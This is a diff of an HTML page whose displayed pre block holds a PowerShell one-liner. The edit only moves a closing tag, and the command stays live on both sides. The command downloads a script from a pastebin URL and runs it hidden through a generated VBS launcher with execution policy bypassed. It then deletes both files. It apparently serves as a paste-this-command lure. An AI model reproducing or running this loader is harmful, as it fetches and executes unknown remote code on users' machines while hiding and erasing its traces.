@@ -151,8 +151,7 @@
       <pre id="content">
 $url = "https://pastebin.com/raw/K9J6wYsP"; $tmpFile = "$env:TEMP\tmp_$(Get-Random).ps1"; Invoke-WebRequest -Uri $url -OutFile $tmpFile; $vbsFile = "$env:TEMP\run_$(Get-Random).vbs"; @"
 CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$tmpFile""", 0, False
-"@ | Out-File $vbsFile -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$vbsFile""" -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue; Remove-Item $vbsFile -Force -ErrorAction SilentlyContinue
-      </pre>
+"@ | Out-File $vbsFile -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$vbsFile""" -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue; Remove-Item $vbsFile -Force -ErrorAction SilentlyContinue</pre>
     </div>
   </div>
 </div>
